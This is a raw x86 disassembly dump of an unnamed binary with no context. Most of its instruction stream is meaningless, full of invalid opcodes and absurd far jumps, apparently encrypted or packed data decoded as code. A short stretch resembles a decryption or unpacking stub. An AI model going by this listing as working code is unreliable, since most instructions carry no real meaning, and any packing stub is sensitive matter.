  409a2e:	jae    0x409a34
  409a30:	mov    ecx,0x4bd0d2d6
  409a35:	and    eax,0x34a975eb
  409a3a:	lods   al,BYTE PTR ds:[esi]
  409a3b:	(bad)  
  409a3c:	daa    
  409a3d:	xchg   edi,eax
  409a3e:	pop    eax
  409a3f:	dec    esi
  409a40:	scas   al,BYTE PTR es:[edi]
  409a41:	inc    edi
  409a42:	popa   
  409a43:	dec    ebp
  409a44:	mov    edx,0x311010b7
  409a49:	and    ebx,DWORD PTR [eax+0x58]
  409a4c:	lock jmp 0x7b9c:0x5cba8d28
  409a54:	mov    esp,ss
  409a56:	xchg   ebx,eax
  409a57:	(bad)  
  409a58:	leave  
  409a59:	mov    BYTE PTR [edi-0x17],ah
  409a5c:	cwde   
  409a5d:	lahf   
  409a5e:	int    0x91
  409a60:	jb     0x409ade
  409a62:	in     al,0x75
  409a64:	sbb    al,0xdc
  409a66:	mov    ebp,0xc6e5976e
  409a6b:	je     0x409ac0
  409a6d:	(bad)  
  409a6e:	sbb    eax,0xec224ef3
  409a73:	pop    ebx
  409a74:	test   al,0x9d
  409a76:	pop    esp
  409a77:	mov    eax,0x5479446d
  409a7c:	adc    ebp,DWORD PTR [edi]
  409a7e:	mov    WORD PTR [edi+0x37],gs
  409a81:	jae    0x409aca
  409a83:	xor    BYTE PTR [esi-0x16],cl
  409a86:	push   es
  409a87:	pop    ebp
  409a88:	fld    DWORD PTR [edx]
  409a8a:	add    ch,ch
  409a8c:	hlt    
  409a8d:	jge    0x409a4c
  409a8f:	pop    ebx
  409a90:	jns    0x409ac1
  409a92:	sub    al,0xfd
  409a94:	loope  0x409b10
  409a96:	mov    ch,0xad
  409a98:	add    BYTE PTR [esi-0x69],ch
  409a9b:	cmp    edx,ebp
  409a9d:	cli    
  409a9e:	push   eax
  409a9f:	or     eax,0x48ae22f3
  409aa4:	repnz push edx
  409aa6:	dec    ebp
  409aa7:	inc    esp
  409aa8:	jbe    0x409aa1
  409aaa:	daa    
  409aab:	pop    edx
  409aac:	es jle 0x409af6
  409aaf:	(bad)  
  409ab0:	out    dx,al
  409ab1:	mov    ah,0xd4
  409ab3:	mov    BYTE PTR [edx-0x14],bh
  409ab6:	fst    DWORD PTR [eax-0x5d75108e]
  409abc:	dec    ebp
  409abd:	jg     0x409a66
  409abf:	xor    al,0x92
  409ac1:	imul   edi,edi,0x445698bc
  409ac7:	pop    ebx
  409ac8:	mov    ch,0x49
  409aca:	push   ss
  409acb:	das    
  409acc:	mov    BYTE PTR [edi],dl
  409ace:	pop    es
  409acf:	jge    0x409a7c
  409ad1:	dec    edi
  409ad2:	xchg   ecx,eax
  409ad3:	aam    0xbb
  409ad5:	leave  
  409ad6:	bound  ebx,QWORD PTR [ebx-0x7c93cb0c]
  409adc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409add:	add    al,al
  409adf:	xor    cl,BYTE PTR [ebx]
  409ae1:	iret   
  409ae2:	pop    ebx
  409ae3:	dec    ebp
  409ae4:	push   0xf2897927
  409ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aea:	in     al,dx
  409aeb:	retf   0x487a
  409aee:	in     eax,0x15
  409af0:	ins    BYTE PTR es:[edi],dx
  409af1:	aad    0xd4
  409af3:	loopne 0x409a7c
  409af5:	add    DWORD PTR [edi+edx*1-0x6e],ecx
  409af9:	xchg   ebp,eax
  409afa:	lsl    ebx,WORD PTR [ebp-0x32f5e72a]
  409b01:	ficomp DWORD PTR [ecx+0x6172b2b3]
  409b07:	pop    DWORD PTR [edx-0x49b84e3c]
  409b0d:	sub    ecx,0x4b
  409b10:	ins    BYTE PTR es:[edi],dx
  409b11:	cdq    
  409b12:	in     eax,dx
  409b13:	inc    edi
  409b14:	imul   DWORD PTR [ecx+0x279d951d]
  409b1a:	pop    ebp
  409b1b:	ins    BYTE PTR es:[edi],dx
  409b1c:	jge    0x409acf
  409b1e:	mov    ebx,DWORD PTR [ebx-0x683c6993]
  409b24:	dec    edx
  409b25:	and    bl,BYTE PTR [edx+0x21ee915f]
  409b2b:	xchg   DWORD PTR [ebp+0x55],ecx
  409b2e:	out    dx,al
  409b2f:	(bad)  
  409b30:	aam    0x8c
  409b32:	xor    al,BYTE PTR [esi]
  409b34:	test   BYTE PTR [ebx+0x26],bl
  409b37:	jp     0x409b38
  409b39:	xor    dh,BYTE PTR [edi+0x503b1362]
  409b3f:	stos   BYTE PTR es:[edi],al
  409b40:	pop    eax
  409b41:	sbb    eax,ecx
  409b43:	(bad)  
  409b45:	push   edx
  409b46:	mov    bh,0x6d
  409b48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b49:	jmp    DWORD PTR [ecx+0x19]
  409b4c:	jp     0x409b1f
  409b4e:	dec    ebp
  409b4f:	push   esi
  409b50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b51:	ds mov ah,0x4d
  409b54:	push   ss
  409b55:	pop    esi
  409b56:	pop    edx
  409b57:	jbe    0x409b80
  409b59:	ja     0x409b62
  409b5b:	jge    0x409bae
  409b5d:	fdiv   st,st(3)
  409b5f:	rcr    DWORD PTR [edi+0xd2fd482],cl
  409b65:	mov    ebp,0x6f70200f
  409b6a:	nop
  409b6b:	mov    DWORD PTR [ebp-0x40],eax
  409b6e:	sub    DWORD PTR ds:0x434603,edx
  409b74:	mov    eax,0x7510851
  409b79:	mov    edi,DWORD PTR ds:0x43455f
  409b7f:	or     DWORD PTR ds:0x4345cf,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x4345ff
  409b8f:	xor    DWORD PTR ds:0x434603,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x4345eb
  409bb7:	mov    edi,DWORD PTR ds:0x4346a3
  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	mov    edx,0x8e6ad8be
  409bd8:	jmp    0x7e7e:0x79707e7e
  409bdf:	push   0xaf8bf046
  409be4:	clc    
  409be5:	pop    eax
  409be6:	jge    0x409bd9
  409be8:	sub    BYTE PTR [ecx-0x17],dh
  409beb:	push   ecx
  409bec:	int3   
  409bed:	es pop esp
  409bef:	ins    DWORD PTR es:[edi],dx
  409bf0:	pop    ebx
  409bf1:	clc    
  409bf2:	sub    edx,esp
  409bf4:	xchg   esp,eax
  409bf5:	pop    ss
  409bf6:	(bad)  
  409bf7:	mov    edi,0x323ca4a3
  409bfc:	jg     0x409c12
  409bfe:	mov    dl,0x67
  409c00:	xor    eax,0x14573833
  409c05:	cmp    al,al
  409c07:	rol    BYTE PTR [edx+eax*4+0x65380cca],0xf9
  409c0f:	(bad)  
  409c10:	ds stc 
  409c12:	and    al,BYTE PTR [eax-0x27305c13]
  409c18:	xchg   ecx,eax
  409c19:	jae    0x409bc6
  409c1b:	push   edx
  409c1c:	clc    
  409c1d:	neg    al
  409c1f:	push   es
  409c20:	cld    
  409c21:	jo     0x409c96
  409c23:	push   esp
  409c24:	inc    edx
  409c25:	cmp    BYTE PTR [edx-0x2b4614d8],al
  409c2b:	cmp    BYTE PTR ds:0x6720e9d4,cl
  409c31:	lea    ebp,[ebx-0x3d1bc927]
  409c37:	je     0x409c7f
  409c39:	mov    ecx,0xa0c974b9
  409c3e:	arpl   si,si
  409c40:	outs   dx,DWORD PTR ds:[esi]
  409c41:	push   edx
  409c42:	pushf  
  409c43:	push   es
  409c44:	or     BYTE PTR [ebx-0xc],cl
  409c47:	fsubr  st,st(6)
  409c49:	loop   0x409c21
  409c4b:	je     0x409c66
  409c4d:	shr    dh,0x5a
  409c50:	call   DWORD PTR [edx+0xa]
  409c53:	or     al,ch
  409c55:	ins    BYTE PTR es:[edi],dx
  409c56:	fcmovnbe st,st(7)
  409c58:	push   0x64
  409c5a:	addr16 aam 0x95
  409c5d:	scas   al,BYTE PTR es:[edi]
  409c5e:	add    ebp,DWORD PTR [edi-0x59]
  409c61:	inc    esi
  409c62:	inc    ebp
  409c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c64:	fild   QWORD PTR [eax]
  409c66:	pop    es
  409c67:	xchg   edi,eax
  409c68:	pusha  
  409c69:	into   
  409c6a:	and    al,0x36
  409c6c:	arpl   WORD PTR [ebp-0x4af76b44],dx
  409c72:	jg     0x409c78
  409c74:	loopne 0x409c21
  409c76:	rcr    DWORD PTR [edx-0x55964449],cl
  409c7c:	and    BYTE PTR [ebp-0x8],bh
  409c7f:	call   0xec1deca
  409c84:	mov    ebp,0x7adefdb6
  409c89:	mov    eax,ds:0x8cb96809
  409c8e:	in     eax,dx
  409c8f:	adc    ecx,DWORD PTR [edx+0x240d27ec]
  409c95:	pop    ds
  409c96:	call   0x3fdec582
  409c9b:	mov    ds:0x8ab46930,al
  409ca0:	push   ebp
  409ca1:	pop    ecx
  409ca2:	test   al,0x6f
  409ca4:	mov    ebp,0x24e081ae
  409ca9:	mov    ?,WORD PTR [ebx-0x399765dc]
  409caf:	fs out 0xcd,al
  409cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cb3:	dec    ecx
  409cb4:	clc    
  409cb5:	mov    bh,BYTE PTR [ebx+ecx*1+0x7b]
  409cb9:	or     al,0xba
  409cbb:	and    DWORD PTR [ecx-0x49a4c7d0],esi
  409cc1:	sahf   
  409cc2:	mov    edi,0xefc3306c
  409cc7:	retf   
  409cc8:	(bad)  
  409cc9:	sahf   
  409cca:	shl    eax,0x4f
  409ccd:	retf   0x6dca
  409cd0:	scas   al,BYTE PTR es:[edi]
  409cd1:	jb     0x409cfb
  409cd3:	rol    BYTE PTR [ecx+0x32],1
  409cd6:	mov    esp,0xf31c87b0
  409cdb:	push   cs
  409cdc:	arpl   WORD PTR [edx],bp
  409cde:	dec    esi
  409cdf:	lock add al,0x51
  409ce2:	add    al,BYTE PTR [edi]
  409ce4:	mov    edi,0x103322b9
  409ce9:	lahf   
  409cea:	add    BYTE PTR [ecx],dl
  409cec:	and    DWORD PTR [eax],ecx
  409cee:	add    eax,0x52238d89
  409cf3:	outs   dx,BYTE PTR ds:[esi]
  409cf4:	jl     0x409c85
  409cf6:	sbb    bl,BYTE PTR [edx]
  409cf8:	shl    ah,cl
  409cfa:	pusha  
  409cfb:	mov    ah,0x7d
  409cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cfe:	scas   al,BYTE PTR es:[edi]
  409cff:	mov    cl,0xdb
  409d01:	div    BYTE PTR [esp+eiz*8]
  409d04:	add    ebx,DWORD PTR [ebx+0x797caa2b]
  409d0a:	test   eax,0xbe465fc5
  409d0f:	out    0x76,al
  409d11:	test   al,0xed
  409d13:	mov    eax,ds:0xcad244
  409d18:	fisttp QWORD PTR [edi]
  409d1a:	sti    
  409d1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d1c:	cli    
  409d1d:	inc    esp
  409d1f:	mov    dl,0x4d
  409d21:	and    DWORD PTR [si-0x4],eax
  409d25:	add    al,0x64
  409d27:	fidivr WORD PTR [ecx]
  409d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d2a:	enter  0x551a,0x1
  409d2e:	cdq    
  409d2f:	cli    
  409d30:	mov    esp,0x45d74198
  409d35:	pop    es
  409d36:	retf   
  409d37:	iret   
  409d38:	out    dx,eax
  409d39:	push   cs
  409d3a:	xchg   BYTE PTR [ebp-0x3bddb09a],ah
  409d40:	outs   dx,BYTE PTR ds:[esi]
  409d41:	(bad)  
  409d42:	les    edx,FWORD PTR [edi+0x4543960e]
  409d48:	dec    DWORD PTR [ebp-0x3d]
  409d4b:	jns    0x409da2
  409d4d:	stc    
  409d4e:	push   cs
  409d4f:	push   ecx
  409d50:	retf   
  409d51:	imul   ebp,DWORD PTR [ecx-0x6ed35123],0x4529d029
  409d5b:	clc    
  409d5c:	or     eax,0x948d36
  409d61:	pop    ecx
  409d62:	lock inc sp
  409d65:	inc    ecx
  409d66:	or     eax,0x47977a42
  409d6b:	retf   0xee00
  409d6e:	js     0x409d4f
  409d70:	sub    dl,dl
  409d72:	jmp    FWORD PTR [eax]
  409d74:	fadd   DWORD PTR [eax+0x3b43890a]
  409d7a:	das    
  409d7b:	movups xmm7,XMMWORD PTR [ecx]
  409d7e:	jmp    0xd86574a9
  409d83:	push   ss
  409d84:	or     BYTE PTR [eax],cl
  409d86:	loope  0x409df4
  409d88:	mov    ah,0x9b
  409d8a:	ret    
  409d8b:	inc    ecx
  409d8c:	mov    DWORD PTR ds:0x7f0f5762,eax
  409d92:	cmp    ch,cl
  409d94:	in     al,0x85
  409d96:	push   eax
  409d97:	push   DWORD PTR [edi]
  409d99:	in     al,dx
  409d9a:	jp     0x409d7a
  409d9c:	sub    eax,0x9a1391d1
  409da1:	add    esp,DWORD PTR [esi+0x27fb95e8]
  409da7:	mov    esp,esp
  409da9:	iret   
  409daa:	xor    ebx,DWORD PTR [esi*4+0x4b1b4bd5]
  409db1:	sbb    eax,0xea125f99
  409db6:	data16 fmul DWORD PTR [eax+0x1]
  409dba:	mov    bh,0xde
  409dbc:	pop    esi
  409dbd:	or     al,0x73
  409dbf:	add    edx,DWORD PTR [edi+eax*2]
  409dc2:	add    al,0x2d
  409dc4:	test   edi,edx
  409dc6:	out    dx,eax
  409dc7:	inc    ebx
  409dc8:	cmp    eax,DWORD PTR [eax+eax*4-0x6999c673]
  409dcf:	push   0xffffff82
  409dd1:	xchg   esp,eax
  409dd2:	mov    ah,0x35
  409dd4:	aam    0x26
  409dd6:	or     BYTE PTR [ebp-0x7a],dh
  409dd9:	and    eax,0x19e98b14
  409dde:	into   
  409ddf:	jne    0x409d61
  409de1:	gs pop esp
  409de3:	jmp    0xb6f3:0x976be279
  409dea:	aas    
  409deb:	sub    edx,DWORD PTR [edx+0x16]
  409dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409def:	stos   DWORD PTR es:[edi],eax
  409df0:	mov    dh,0x79
  409df2:	dec    eax
  409df3:	sub    cl,BYTE PTR [esi-0x6158c34f]
  409df9:	aas    
  409dfa:	arpl   WORD PTR [edi-0x49],ax
  409dfd:	out    dx,al
  409dfe:	stos   DWORD PTR es:[edi],eax
  409dff:	push   ss
  409e00:	xchg   BYTE PTR [edi-0x54],ah
  409e03:	sub    edx,esp
  409e05:	sub    al,0xce
  409e07:	or     al,0xda
  409e09:	loope  0x409e75
  409e0b:	jle    0x409e54
  409e0d:	mov    WORD PTR [edx],ds
  409e0f:	push   esp
  409e10:	mov    esi,?
  409e12:	or     bl,dh
  409e14:	jbe    0x409dd6
  409e16:	rol    cl,0x8c
  409e19:	push   0xd6c11305
  409e1e:	ja     0x409e9e
  409e20:	cs into 
  409e22:	add    dl,bl
  409e24:	test   BYTE PTR [eax+0xe],ah
  409e27:	mov    DWORD PTR [eax+eiz*4+0xb],ebp
  409e2b:	mov    ecx,0xdb9fb60b
  409e30:	add    ch,dl
  409e32:	add    al,0x84
  409e34:	popa   
  409e35:	and    DWORD PTR [ecx-0x6081d0cd],edi
  409e3b:	xor    eax,0x115d8b8f
  409e40:	mov    ch,0xba
  409e42:	test   al,0x1f
  409e44:	xor    cl,BYTE PTR [edx]
  409e46:	mov    ?,WORD PTR [ecx-0x171c1351]
  409e4c:	mov    edx,0xce6a4f46
  409e51:	out    dx,al
  409e52:	fsubr  DWORD PTR [eax+0x374aff4e]
  409e58:	pushf  
  409e59:	int    0x4a
  409e5b:	mov    cl,0xd
  409e5d:	in     eax,dx
  409e5e:	pop    ds
  409e5f:	fild   WORD PTR [edx+0x1230c41a]
  409e65:	int    0x7d
  409e67:	sub    al,BYTE PTR [ecx+0xc]
  409e6a:	sbb    cl,BYTE PTR [ecx]
  409e6c:	cli    
  409e6d:	cmp    dl,0x70
  409e70:	out    0xb2,al
  409e72:	xor    eax,DWORD PTR [ecx]
  409e74:	dec    edi
  409e75:	das    
  409e76:	rcl    DWORD PTR [edx+0x60f9e158],0x6e
  409e7d:	inc    esi
  409e7e:	test   al,0xf1
  409e80:	push   ss
  409e81:	pop    ds
  409e82:	fsub   QWORD PTR [edi+edi*4]
  409e85:	pop    ecx
  409e86:	sti    
  409e87:	push   ds
  409e88:	mov    eax,ds:0xf151e145
  409e8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e8e:	shl    bl,1
  409e90:	adc    al,0xe7
  409e92:	cmc    
  409e93:	push   ds
  409e94:	sub    BYTE PTR [edx-0x3b],0xc3
  409e98:	or     al,0xcf
  409e9a:	(bad)  
  409e9b:	loop   0x409e55
  409e9d:	ret    
  409e9e:	lods   al,BYTE PTR ds:[esi]
  409e9f:	mov    ah,0xe0
  409ea1:	ins    DWORD PTR es:[edi],dx
  409ea2:	enter  0x60f3,0xe6
  409ea6:	cmp    DWORD PTR [ebp+0x3383e2da],ebx
  409eac:	mov    al,0x4b
  409eae:	dec    eax
  409eaf:	js     0x409ee9
  409eb1:	pop    esi
  409eb2:	icebp  
  409eb3:	xor    al,0x20
  409eb5:	lahf   
  409eb6:	cs mov bl,0x85
  409eb9:	jecxz  0x409ea3
  409ebb:	stc    
  409ebc:	sbb    BYTE PTR [edi],0x53
  409ebf:	xor    BYTE PTR [edx],bl
  409ec1:	or     BYTE PTR [ecx],bl
  409ec3:	mov    WORD PTR [ebx],?
  409ec5:	xchg   esi,eax
  409ec6:	sbb    BYTE PTR [edx+0x44],dl
  409ec9:	mov    edi,0x37fc82e8
  409ece:	inc    ebp
  409ecf:	gs aad 0x94
  409ed2:	push   edi
  409ed3:	mov    ch,0x27
  409ed5:	and    al,0x30
  409ed7:	push   cs
  409ed8:	ins    DWORD PTR es:[edi],dx
  409ed9:	jle    0x409f25
  409edb:	add    al,0xb3
  409edd:	pop    edi
  409ede:	out    0xd3,al
  409ee0:	dec    eax
  409ee1:	mov    ds:0x12bcb155,eax
  409ee6:	(bad)  
  409ee7:	jecxz  0x409e69
  409ee9:	inc    ebx
  409eea:	jg     0x409e9a
  409eec:	sti    
  409eed:	cmp    DWORD PTR [eax+0x4],0xcc71966f
  409ef4:	lods   al,BYTE PTR ds:[esi]
  409ef5:	mov    es,WORD PTR [ebx]
  409ef7:	or     BYTE PTR [ebx+0x0],bl
  409efa:	ss data16 mov bl,0xc2
  409efe:	sbb    DWORD PTR [edi+0x77],edi
  409f01:	aas    
  409f02:	gs lahf 
  409f04:	(bad)  
  409f05:	dec    eax
  409f06:	(bad)  
  409f08:	ja     0x409ed2
  409f0a:	test   bl,dl
  409f0c:	repz inc esp
  409f0e:	xchg   edi,eax
  409f0f:	pop    ss
  409f10:	es (bad) 
  409f13:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  409f15:	rcl    DWORD PTR [ebp-0x247843eb],0x25
  409f1c:	jp     0x409f8d
  409f1e:	stos   BYTE PTR es:[edi],al
  409f1f:	pushf  
  409f20:	cli    
  409f21:	test   DWORD PTR [esi],ebx
  409f23:	lds    edx,FWORD PTR [edi-0x12507145]
  409f29:	add    ebx,DWORD PTR [ecx]
  409f2b:	lods   al,BYTE PTR ds:[esi]
  409f2c:	imul   edi,DWORD PTR [ecx+0x2e],0x23beb993
  409f33:	or     BYTE PTR [eax+0x20],bl
  409f36:	pop    ebp
  409f37:	repz loop 0x409f11
  409f3a:	add    BYTE PTR [edx+0x37fd3920],0xf3
  409f41:	repnz ss pop eax
  409f44:	stos   BYTE PTR es:[edi],al
  409f45:	loopne 0x409ef8
  409f47:	sbb    BYTE PTR ds:0xa709f75,dh
  409f4d:	sti    
  409f4e:	mov    al,ds:0x75d3b8
  409f53:	(bad)  
  409f54:	pop    edx
  409f55:	push   0x2af8ef73
  409f5a:	ja     0x409faa
  409f5c:	mov    bh,0x98
  409f5e:	and    ecx,DWORD PTR [ebp-0x11]
  409f61:	or     dl,dl
  409f63:	cli    
  409f64:	sbb    edx,DWORD PTR [edi]
  409f66:	push   ecx
  409f67:	dec    edi
  409f68:	lock adc al,0xeb
  409f6b:	pop    edi
  409f6c:	sub    BYTE PTR [esi-0x67c5e78f],ah
  409f72:	shl    BYTE PTR [ebx+eax*2-0x46dd615a],0x7b
  409f7a:	cwde   
  409f7b:	push   esi
  409f7c:	push   ds
  409f7d:	push   ebx
  409f7e:	inc    ebp
  409f7f:	shl    BYTE PTR [esp+ebp*2],1
  409f82:	ror    esp,0x58
  409f85:	sbb    al,0x28
  409f87:	sub    ebx,DWORD PTR [esi-0xe68efd1]
  409f8d:	ins    DWORD PTR es:[edi],dx
  409f8e:	push   ecx
  409f8f:	(bad)  
  409f91:	rep movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  409f94:	jns    0x409f39
  409f96:	adc    edx,DWORD PTR [ecx]
  409f98:	test   DWORD PTR [esi+0x41b87284],ebx
  409f9e:	push   eax
  409f9f:	sub    eax,edx
  409fa1:	and    DWORD PTR [edi+0x13d1378d],0xffffffb0
  409fa8:	out    dx,al
  409fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409faa:	es dec esp
  409fac:	jp     0x40a022
  409fae:	or     ecx,eax
  409fb0:	cmp    al,0xcd
  409fb2:	pop    ecx
  409fb3:	mul    ah
  409fb5:	dec    ecx
  409fb6:	xchg   ebp,eax
  409fb7:	fwait
  409fb8:	test   eax,0x17db7752
  409fbd:	sahf   
  409fbe:	cmp    DWORD PTR [esi-0x302d70a9],esi
  409fc4:	pop    edx
  409fc5:	pop    esi
  409fc6:	leave  
  409fc7:	push   ecx
  409fc8:	cmp    cl,BYTE PTR [ecx+eax*2+0x24a11289]
  409fcf:	cmp    bl,BYTE PTR [ecx-0xaa7f22a]
  409fd5:	or     bl,BYTE PTR [eax+0x45c78c4f]
  409fdb:	fdivr  DWORD PTR [eax]
  409fdd:	test   DWORD PTR [eax+edi*8+0x12e9ff23],ebx
  409fe4:	add    al,0x0
  409fe6:	add    BYTE PTR [ecx+0x6b],ah
  409fe9:	in     al,dx
  409fea:	(bad)  
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	fnstcw WORD PTR [ecx+0x41]
  409ff5:	aas    
  409ff6:	add    BYTE PTR [eax+0x707e7ef6],0x79
  409ffd:	jle    0x40a07d
  409fff:	cmp    al,0x8e
  40a001:	mov    WORD PTR [ebx-0x2b],ds
  40a004:	mov    esi,0xb45506e
  40a009:	pop    eax
  40a00a:	test   eax,0x46aeb869
  40a00f:	mov    cl,0xe2
  40a011:	data16 loopne 0x40a061
  40a014:	cwde   
  40a015:	jmp    0x5e90:0xcff93640
  40a01c:	add    DWORD PTR [eax-0xafcaa8c],ebp
  40a022:	clc    
  40a023:	cmp    ch,BYTE PTR [eax-0x65b615f2]
  40a029:	es adc al,0x56
  40a02c:	(bad)  
  40a02d:	or     DWORD PTR ds:0xaa5b236c,ecx
  40a033:	stc    
  40a034:	repz sbb DWORD PTR [esi-0x15],0x3
  40a039:	jg     0x409feb
  40a03b:	mov    ecx,0x1f013a7a
  40a040:	fcom   QWORD PTR [ebx+0x6af3ec13]
  40a046:	stos   DWORD PTR es:[edi],eax
  40a047:	mov    cl,0xa5
  40a049:	fwait
  40a04a:	arpl   WORD PTR [esi+0x3b],cx
  40a04d:	cmp    DWORD PTR [esi+eax*2],0x1e
  40a051:	and    eax,0xdafb046e
  40a056:	fist   DWORD PTR [ecx+0x2e]
  40a059:	fstp   TBYTE PTR [ebx+esi*2]
  40a05c:	out    dx,al
  40a05d:	sbb    eax,0x68d51e2
  40a062:	sbb    esp,DWORD PTR [eax+0x7f9f2a3b]
  40a068:	push   eax
  40a069:	into   
  40a06a:	cmp    al,BYTE PTR [edx+0x50]
  40a06d:	xchg   ebx,eax
  40a06e:	cld    
  40a06f:	pop    ss
  40a070:	ret    0xb122
  40a073:	sbb    BYTE PTR fs:[ecx],cl
  40a076:	fbld   TBYTE PTR [ecx]
  40a078:	dec    ecx
  40a079:	pusha  
  40a07a:	mov    dh,0x5b
  40a07c:	mov    eax,esi
  40a07e:	mov    ds:0xbe888db6,al
  40a083:	or     al,0x1b
  40a085:	fs xor al,0x4
  40a088:	into   
  40a089:	push   esi
  40a08a:	sar    DWORD PTR [eax+ebp*1],1
  40a08d:	mov    WORD PTR [esi+ecx*2-0x5c0d4bdc],gs
  40a094:	outs   dx,BYTE PTR ds:[esi]
  40a095:	lds    edx,FWORD PTR [edx+ebx*8+0x6d]
  40a099:	dec    eax
  40a09a:	pop    ebx
  40a09b:	xchg   BYTE PTR [ebp-0x7f016ed5],al
  40a0a1:	xor    DWORD PTR [eax],0x373a1c47
  40a0a7:	pop    ebp
  40a0a8:	out    0x52,al
  40a0aa:	imul   ebp,DWORD PTR [esi-0x78d39688],0x2e
  40a0b1:	sbb    ecx,DWORD PTR [edx-0x310b7586]
  40a0b7:	push   0xfffffff4
  40a0b9:	stos   DWORD PTR es:[edi],eax
  40a0ba:	(bad)  
  40a0bc:	shl    al,cl
  40a0be:	or     DWORD PTR [ecx],esi
  40a0c0:	jge    0x40a0c6
  40a0c2:	adc    DWORD PTR [ecx],eax
  40a0c4:	into   
  40a0c5:	ds clc 
  40a0c7:	in     eax,0x8b
  40a0c9:	clc    
  40a0ca:	adc    BYTE PTR [edi-0x5],cl
  40a0cd:	cli    
  40a0ce:	div    DWORD PTR ss:[edx+ebx*8+0x33]
  40a0d3:	sub    al,0x2b
  40a0d5:	rcl    BYTE PTR [edx+0x172b475f],0xd5
  40a0dc:	pop    ds
  40a0dd:	mov    ch,0xf1
  40a0df:	leave  
  40a0e0:	xchg   ecx,eax
  40a0e1:	lahf   
  40a0e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0e3:	(bad)  
  40a0e4:	sub    dh,al
  40a0e6:	push   esi
  40a0e7:	in     al,dx
  40a0e8:	outs   dx,BYTE PTR ds:[esi]
  40a0e9:	in     eax,0x55
  40a0eb:	add    ch,ch
  40a0ed:	ins    BYTE PTR es:[edi],dx
  40a0ee:	xchg   edx,eax
  40a0ef:	bound  edx,QWORD PTR ds:0x61cd092e
  40a0f5:	jo     0x40a12b
  40a0f7:	jmp    0x2eda:0x6f6750ef
  40a0fe:	xor    esp,DWORD PTR gs:[edx+0x58]
  40a102:	sub    al,0xb4
  40a104:	lea    ecx,[edi]
  40a106:	mov    esp,0x9bab4a69
  40a10b:	mov    eax,0x2c3ee2d6
  40a110:	xor    al,BYTE PTR ss:[eax+0x26]
  40a114:	push   0x11724cb4
  40a119:	pop    esi
  40a11a:	aaa    
  40a11b:	nop
  40a11c:	leave  
  40a11d:	in     al,dx
  40a11e:	popf   
  40a11f:	rol    esi,0xd7
  40a122:	loopne 0x40a106
  40a124:	cmp    DWORD PTR [edi+0x6d],edi
  40a127:	mov    DWORD PTR [ecx],ebp
  40a129:	sbb    DWORD PTR [ebx+eax*1+0x7bc1f0c9],esp
  40a130:	mov    bh,0x4d
  40a132:	in     al,0x81
  40a134:	adc    al,0xad
  40a137:	and    eax,0xa2df3bda
  40a13c:	jne    0x40a19c
  40a13e:	sbb    dh,BYTE PTR [ebp+0x6b]
  40a141:	xchg   esi,eax
  40a142:	lock test BYTE PTR [ebp+0xe],ah
  40a146:	fld    st(7)
  40a148:	lock sbb ebp,DWORD PTR [eax+0x7d]
  40a14c:	es addr16 pop eax
  40a14f:	mov    gs,WORD PTR [edx+0x6b]
  40a152:	mov    bh,0x75
  40a154:	xchg   BYTE PTR [edx-0x2a99077f],dh
  40a15a:	sub    al,0xd
  40a15c:	push   esi
  40a15d:	add    BYTE PTR [edx],bl
  40a15f:	stc    
  40a160:	cs int 0xe
  40a163:	cmp    BYTE PTR [esi+0x48],dl
  40a166:	int3   
  40a167:	call   0x98ecd47b
  40a16c:	dec    esp
  40a16d:	push   0xffffff9a
  40a16f:	jb     0x40a155
  40a171:	inc    eax
  40a172:	adc    ebx,DWORD PTR [eax+0x69]
  40a175:	mov    ecx,0xc900f428
  40a17a:	call   0xaa6c:0x75cb671
  40a181:	lahf   
  40a182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a183:	in     eax,0xa5
  40a185:	and    BYTE PTR [ecx+0x7e],al
  40a188:	in     eax,0x5a
  40a18a:	scas   al,BYTE PTR es:[edi]
  40a18b:	call   DWORD PTR [ebx-0x50]
  40a18e:	xchg   edx,eax
  40a18f:	ins    DWORD PTR es:[edi],dx
  40a190:	stos   DWORD PTR es:[edi],eax
  40a191:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a193:	int3   
  40a194:	dec    edi
  40a195:	ins    DWORD PTR es:[edi],dx
  40a196:	xchg   ebp,eax
  40a197:	stc    
  40a198:	stos   DWORD PTR es:[edi],eax
  40a199:	cmp    bl,BYTE PTR [esi+ebp*2-0x58]
  40a19d:	jno    0x40a140
  40a19f:	push   eax
  40a1a0:	add    BYTE PTR [esi],ah
  40a1a2:	dec    ecx
  40a1a3:	add    BYTE PTR [esi+0x2d40ba34],al
  40a1a9:	out    dx,al
  40a1aa:	js     0x40a1fd
